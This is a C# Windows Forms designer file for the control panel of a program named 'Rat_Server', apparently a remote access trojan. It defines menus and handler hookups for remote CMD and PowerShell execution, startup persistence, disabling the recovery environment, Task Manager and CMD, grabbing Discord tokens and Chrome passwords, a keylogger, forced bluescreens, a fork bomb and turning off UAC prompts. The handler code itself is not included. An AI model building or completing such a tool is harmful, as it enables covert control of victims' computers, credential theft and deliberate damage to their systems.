﻿namespace Rat_Server
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.mainToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.commandExecutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.persistanceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableRecoveryEnvironmentToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.enableRecoveryEnvironmentToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableCMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.enableCMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disableTasToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.enableTaskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.addToStartupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeFromStartuToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.infoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.grabTokensToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.chromePasswordsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.connectionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.kIllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.trollToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.bluescreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.jumpscareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.volume100ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.miscToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.forceUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.filesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.comboBoxClients = new Guna.UI2.WinForms.Guna2ComboBox();
            this.listView1 = new System.Windows.Forms.ListView();
            this.forkBombToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.monitoringClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.startKeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stopKeyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.notifyUACToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2ContextMenuStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // guna2ContextMenuStrip1
            // 
            this.guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(40, 40);
            this.guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.mainToolStripMenuItem});
            this.guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip1.Size = new System.Drawing.Size(181, 48);
            // 
            // mainToolStripMenuItem
            // 
            this.mainToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.commandExecutionToolStripMenuItem,
            this.persistanceToolStripMenuItem,
            this.infoToolStripMenuItem,
            this.connectionToolStripMenuItem,
            this.trollToolStripMenuItem,
            this.miscToolStripMenuItem,
            this.filesToolStripMenuItem,
            this.monitoringClientToolStripMenuItem});
            this.mainToolStripMenuItem.Name = "mainToolStripMenuItem";
            this.mainToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.mainToolStripMenuItem.Text = "Main";
            // 
            // commandExecutionToolStripMenuItem
            // 
            this.commandExecutionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cMDToolStripMenuItem,
            this.powershellToolStripMenuItem});
            this.commandExecutionToolStripMenuItem.Name = "commandExecutionToolStripMenuItem";
            this.commandExecutionToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.commandExecutionToolStripMenuItem.Text = "Command Execution";
            // 
            // cMDToolStripMenuItem
            // 
            this.cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
            this.cMDToolStripMenuItem.Size = new System.Drawing.Size(131, 22);
            this.cMDToolStripMenuItem.Text = "CMD";
            this.cMDToolStripMenuItem.Click += new System.EventHandler(this.CmdCommand_Click);
            // 
            // powershellToolStripMenuItem
            // 
            this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
            this.powershellToolStripMenuItem.Size = new System.Drawing.Size(131, 22);
            this.powershellToolStripMenuItem.Text = "Powershell";
            this.powershellToolStripMenuItem.Click += new System.EventHandler(this.PowershellCommand_Click);
            // 
            // persistanceToolStripMenuItem
            // 
            this.persistanceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.disableRecoveryEnvironmentToolStripMenuItem,
            this.enableRecoveryEnvironmentToolStripMenuItem,
            this.disableCMDToolStripMenuItem,
            this.enableCMDToolStripMenuItem,
            this.disableTasToolStripMenuItem,
            this.enableTaskManagerToolStripMenuItem,
            this.addToStartupToolStripMenuItem,
            this.removeFromStartuToolStripMenuItem});
            this.persistanceToolStripMenuItem.Name = "persistanceToolStripMenuItem";
            this.persistanceToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.persistanceToolStripMenuItem.Text = "Persistance";
            // 
            // disableRecoveryEnvironmentToolStripMenuItem
            // 
            this.disableRecoveryEnvironmentToolStripMenuItem.Name = "disableRecoveryEnvironmentToolStripMenuItem";
            this.disableRecoveryEnvironmentToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.disableRecoveryEnvironmentToolStripMenuItem.Text = "Disable Recovery Environment";
            this.disableRecoveryEnvironmentToolStripMenuItem.Click += new System.EventHandler(this.ReagentcDisable_Click);
            // 
            // enableRecoveryEnvironmentToolStripMenuItem
            // 
            this.enableRecoveryEnvironmentToolStripMenuItem.Name = "enableRecoveryEnvironmentToolStripMenuItem";
            this.enableRecoveryEnvironmentToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.enableRecoveryEnvironmentToolStripMenuItem.Text = "Enable Recovery Environment";
            this.enableRecoveryEnvironmentToolStripMenuItem.Click += new System.EventHandler(this.ReagentcEnable_Click);
            // 
            // disableCMDToolStripMenuItem
            // 
            this.disableCMDToolStripMenuItem.Name = "disableCMDToolStripMenuItem";
            this.disableCMDToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.disableCMDToolStripMenuItem.Text = "Disable CMD";
            this.disableCMDToolStripMenuItem.Click += new System.EventHandler(this.DisableCmd_Click);
            // 
            // enableCMDToolStripMenuItem
            // 
            this.enableCMDToolStripMenuItem.Name = "enableCMDToolStripMenuItem";
            this.enableCMDToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.enableCMDToolStripMenuItem.Text = "Enable CMD";
            this.enableCMDToolStripMenuItem.Click += new System.EventHandler(this.EnableCmd_Click);
            // 
            // disableTasToolStripMenuItem
            // 
            this.disableTasToolStripMenuItem.Name = "disableTasToolStripMenuItem";
            this.disableTasToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.disableTasToolStripMenuItem.Text = "Disable Task Manager";
            this.disableTasToolStripMenuItem.Click += new System.EventHandler(this.DisableTaskManager_Click);
            // 
            // enableTaskManagerToolStripMenuItem
            // 
            this.enableTaskManagerToolStripMenuItem.Name = "enableTaskManagerToolStripMenuItem";
            this.enableTaskManagerToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.enableTaskManagerToolStripMenuItem.Text = "Enable Task Manager";
            this.enableTaskManagerToolStripMenuItem.Click += new System.EventHandler(this.EnableTaskManager_Click);
            // 
            // addToStartupToolStripMenuItem
            // 
            this.addToStartupToolStripMenuItem.Name = "addToStartupToolStripMenuItem";
            this.addToStartupToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.addToStartupToolStripMenuItem.Text = "Add To Startup";
            this.addToStartupToolStripMenuItem.Click += new System.EventHandler(this.AddToStartup_Click);
            // 
            // removeFromStartuToolStripMenuItem
            // 
            this.removeFromStartuToolStripMenuItem.Name = "removeFromStartuToolStripMenuItem";
            this.removeFromStartuToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.removeFromStartuToolStripMenuItem.Text = "Remove From Startup";
            this.removeFromStartuToolStripMenuItem.Click += new System.EventHandler(this.RemoveFromStartup_Click);
            // 
            // infoToolStripMenuItem
            // 
            this.infoToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.grabTokensToolStripMenuItem,
            this.chromePasswordsToolStripMenuItem});
            this.infoToolStripMenuItem.Name = "infoToolStripMenuItem";
            this.infoToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.infoToolStripMenuItem.Text = "Info";
            // 
            // grabTokensToolStripMenuItem
            // 
            this.grabTokensToolStripMenuItem.Name = "grabTokensToolStripMenuItem";
            this.grabTokensToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            this.grabTokensToolStripMenuItem.Text = "Grab Tokens";
            this.grabTokensToolStripMenuItem.Click += new System.EventHandler(this.GetDiscordTokens_Click);
            // 
            // chromePasswordsToolStripMenuItem
            // 
            this.chromePasswordsToolStripMenuItem.Name = "chromePasswordsToolStripMenuItem";
            this.chromePasswordsToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
            this.chromePasswordsToolStripMenuItem.Text = "Chrome Passwords";
            this.chromePasswordsToolStripMenuItem.Click += new System.EventHandler(this.chromePasswords_Click);
            // 
            // connectionToolStripMenuItem
            // 
            this.connectionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.kIllToolStripMenuItem});
            this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.connectionToolStripMenuItem.Text = "Connection";
            // 
            // kIllToolStripMenuItem
            // 
            this.kIllToolStripMenuItem.Name = "kIllToolStripMenuItem";
            this.kIllToolStripMenuItem.Size = new System.Drawing.Size(221, 22);
            this.kIllToolStripMenuItem.Text = "Kill Connection and Process";
            this.kIllToolStripMenuItem.Click += new System.EventHandler(this.kill_Click);
            // 
            // trollToolStripMenuItem
            // 
            this.trollToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.bluescreenToolStripMenuItem,
            this.jumpscareToolStripMenuItem,
            this.volume100ToolStripMenuItem,
            this.forkBombToolStripMenuItem});
            this.trollToolStripMenuItem.Name = "trollToolStripMenuItem";
            this.trollToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.trollToolStripMenuItem.Text = "Troll :)";
            // 
            // bluescreenToolStripMenuItem
            // 
            this.bluescreenToolStripMenuItem.Name = "bluescreenToolStripMenuItem";
            this.bluescreenToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.bluescreenToolStripMenuItem.Text = "Bluescreen";
            this.bluescreenToolStripMenuItem.Click += new System.EventHandler(this.bsod_Click);
            // 
            // jumpscareToolStripMenuItem
            // 
            this.jumpscareToolStripMenuItem.Name = "jumpscareToolStripMenuItem";
            this.jumpscareToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.jumpscareToolStripMenuItem.Text = "Jumpscare";
            this.jumpscareToolStripMenuItem.Click += new System.EventHandler(this.jeff_Click);
            // 
            // volume100ToolStripMenuItem
            // 
            this.volume100ToolStripMenuItem.Name = "volume100ToolStripMenuItem";
            this.volume100ToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.volume100ToolStripMenuItem.Text = "Volume 100";
            this.volume100ToolStripMenuItem.Click += new System.EventHandler(this.SetVolumeTo100_Click);
            // 
            // miscToolStripMenuItem
            // 
            this.miscToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.forceUACToolStripMenuItem,
            this.notifyUACToolStripMenuItem});
            this.miscToolStripMenuItem.Name = "miscToolStripMenuItem";
            this.miscToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.miscToolStripMenuItem.Text = "Misc";
            // 
            // forceUACToolStripMenuItem
            // 
            this.forceUACToolStripMenuItem.Name = "forceUACToolStripMenuItem";
            this.forceUACToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.forceUACToolStripMenuItem.Text = "Never Notify UAC";
            this.forceUACToolStripMenuItem.Click += new System.EventHandler(this.uac_Click);
            // 
            // filesToolStripMenuItem
            // 
            this.filesToolStripMenuItem.Name = "filesToolStripMenuItem";
            this.filesToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.filesToolStripMenuItem.Text = "Files";
            // 
            // comboBoxClients
            // 
            this.comboBoxClients.BackColor = System.Drawing.Color.Transparent;
            this.comboBoxClients.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboBoxClients.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBoxClients.FocusedColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.comboBoxClients.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.comboBoxClients.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.comboBoxClients.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(68)))), ((int)(((byte)(88)))), ((int)(((byte)(112)))));
            this.comboBoxClients.ItemHeight = 30;
            this.comboBoxClients.Location = new System.Drawing.Point(570, 31);
            this.comboBoxClients.Name = "comboBoxClients";
            this.comboBoxClients.Size = new System.Drawing.Size(140, 36);
            this.comboBoxClients.TabIndex = 1;
            // 
            // listView1
            // 
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(0, 1);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(564, 97);
            this.listView1.TabIndex = 2;
            this.listView1.UseCompatibleStateImageBehavior = false;
            // 
            // forkBombToolStripMenuItem
            // 
            this.forkBombToolStripMenuItem.Name = "forkBombToolStripMenuItem";
            this.forkBombToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.forkBombToolStripMenuItem.Text = "Fork Bomb";
            this.forkBombToolStripMenuItem.Click += new System.EventHandler(this.forkBomb_Click);
            // 
            // monitoringClientToolStripMenuItem
            // 
            this.monitoringClientToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.keyloggerToolStripMenuItem});
            this.monitoringClientToolStripMenuItem.Name = "monitoringClientToolStripMenuItem";
            this.monitoringClientToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.monitoringClientToolStripMenuItem.Text = "Monitoring Client";
            // 
            // keyloggerToolStripMenuItem
            // 
            this.keyloggerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startKeyloggerToolStripMenuItem,
            this.stopKeyloggerToolStripMenuItem});
            this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.keyloggerToolStripMenuItem.Text = "Keylogger";
            // 
            // startKeyloggerToolStripMenuItem
            // 
            this.startKeyloggerToolStripMenuItem.Name = "startKeyloggerToolStripMenuItem";
            this.startKeyloggerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.startKeyloggerToolStripMenuItem.Text = "Start Keylogger";
            this.startKeyloggerToolStripMenuItem.Click += new System.EventHandler(this.keylogger_Click);
            // 
            // stopKeyloggerToolStripMenuItem
            // 
            this.stopKeyloggerToolStripMenuItem.Name = "stopKeyloggerToolStripMenuItem";
            this.stopKeyloggerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.stopKeyloggerToolStripMenuItem.Text = "Stop Keylogger";
            this.stopKeyloggerToolStripMenuItem.Click += new System.EventHandler(this.stopKeylogger_Click);
            // 
            // notifyUACToolStripMenuItem
            // 
            this.notifyUACToolStripMenuItem.Name = "notifyUACToolStripMenuItem";
            this.notifyUACToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            this.notifyUACToolStripMenuItem.Text = "Notify UAC";
            this.notifyUACToolStripMenuItem.Click += new System.EventHandler(this.uacNotify_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(722, 445);
            this.ContextMenuStrip = this.guna2ContextMenuStrip1;
            this.Controls.Add(this.listView1);
            this.Controls.Add(this.comboBoxClients);
            this.Name = "Form1";
            this.Text = "Form1";
            this.guna2ContextMenuStrip1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private Guna.UI2.WinForms.Guna2ContextMenuStrip guna2ContextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem mainToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem commandExecutionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cMDToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem powershellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem persistanceToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disableRecoveryEnvironmentToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem enableRecoveryEnvironmentToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disableCMDToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem enableCMDToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disableTasToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem enableTaskManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem addToStartupToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem removeFromStartuToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem infoToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem grabTokensToolStripMenuItem;
        private Guna.UI2.WinForms.Guna2ComboBox comboBoxClients;
        private System.Windows.Forms.ToolStripMenuItem chromePasswordsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem connectionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem kIllToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem trollToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem bluescreenToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem jumpscareToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem volume100ToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem miscToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem forceUACToolStripMenuItem;
        private System.Windows.Forms.ListView listView1;
        private System.Windows.Forms.ToolStripMenuItem filesToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem forkBombToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem monitoringClientToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startKeyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem stopKeyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem notifyUACToolStripMenuItem;
    }
}

